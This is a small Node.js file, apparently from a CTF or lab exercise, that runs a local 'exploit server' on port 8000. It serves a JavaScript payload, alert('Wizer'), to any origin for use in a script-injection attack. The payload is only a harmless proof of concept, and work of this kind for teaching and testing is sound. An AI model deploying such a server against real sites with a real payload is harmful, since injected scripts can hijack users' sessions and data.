const http = require('http');

const server = http.createServer((req, res) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    
    if (req.url === '/script.js') {
        res.writeHead(200, {
            'Content-Type': 'application/javascript',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(`alert('Wizer')`);
        console.log('  -> Served malicious script.js');
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

server.listen(8000, () => {
    console.log('Exploit server running on http://localhost:8000');
    console.log('Waiting for requests to /script.js...');
});
